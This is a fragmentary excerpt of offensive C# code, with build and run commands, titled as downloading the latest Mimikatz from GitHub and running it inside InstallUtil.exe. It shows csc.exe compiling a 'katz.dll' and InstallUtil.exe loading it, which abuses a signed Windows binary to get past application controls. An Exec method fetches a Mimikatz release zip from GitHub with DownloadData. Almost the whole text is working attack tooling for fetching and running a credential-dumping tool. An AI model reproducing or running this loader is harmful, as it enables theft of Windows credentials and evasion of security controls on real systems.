...
Downloads Latest Mimikatz From GitHut and Executes inside InstallUtil.exe

C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /r:System.IO.Compression.dll /target:library /out:katz.dll /unsafe katz.cs

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /katz.dll
    ...
    public class Katz
    {
        ...
        public static void Exec()
        {
            ...
            try
            {
				...
				byte[] latestMimikatz = getKatz.DownloadData(@"https://github.com/gentilkiwi/mimikatz/releases/download/2.1.0-alpha-20160112/mimikatz_trunk.zip");
